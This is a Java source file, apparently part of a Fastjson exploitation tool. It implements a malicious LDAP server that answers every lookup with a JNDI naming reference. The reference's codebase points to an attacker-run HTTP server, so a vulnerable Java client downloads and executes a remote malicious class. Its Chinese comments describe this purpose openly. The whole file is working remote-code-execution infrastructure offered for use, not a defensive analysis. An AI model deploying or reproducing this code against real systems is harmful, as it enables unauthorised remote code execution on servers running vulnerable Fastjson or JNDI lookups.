package com.fastjsontool.exploit.JNDI;

import com.fastjsontool.exploit.Info;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.UnknownHostException;

public class LDAPSERVER {
    // 定义一个远程的jar，jar中包含一个恶意攻击的对象的工厂类
    public static String REMOTE_REFERENCE_JAR = "";

    //设置LDAP基底DN
    private static final String LDAP_BASE = "dc=alibaba,dc=com";
    private static String ipaddr=Info.ipaddr;
    private static int Httport=Info.httpPort;
    private static int LDAPPort=Info.port;
    private static String ClassName= Info.className;


    public static void ldapServer() throws LDAPException, UnknownHostException {
        String LDAP_URL = "ldap://" + ipaddr + ":" + LDAPPort + "/" + ClassName;
        REMOTE_REFERENCE_JAR="http://" + ipaddr + ":" + Integer.toString(Httport) + "/"; //获取本地启动的java简易http服务
        //创建LDAP配置对象,需要导包
        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);

        //设置LDAP监听配置信息
        config.setListenerConfigs(new InMemoryListenerConfig("listen",
                InetAddress.getByName("0.0.0.0"),
                LDAPPort,
                ServerSocketFactory.getDefault(),
                SocketFactory.getDefault(),
                (SSLSocketFactory) SSLSocketFactory.getDefault()));

        //添加自定义的LDAP操作拦击器
        config.addInMemoryOperationInterceptor(new OperationInterceptor());
        // 创建LDAP服务对象
        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);

        // 启动服务
        ds.startListening();

        System.out.println("LDAP服务启动成功,服务地址：" + LDAP_URL);

    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base  = result.getRequest().getBaseDN();
            Entry  entry = new Entry(base);

            try {
                // 设置对象的工厂类名
                entry.addAttribute("javaClassName", ClassName);
                entry.addAttribute("javaFactory", ClassName);

                // 设置远程的恶意引用对象的jar地址
                entry.addAttribute("javaCodeBase", REMOTE_REFERENCE_JAR);

                // 设置LDAP objectClass
                entry.addAttribute("objectClass", "javaNamingReference");

                result.sendSearchEntry(entry);
                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
            } catch (Exception e1) {
                e1.printStackTrace();
            }
        }

    }
}
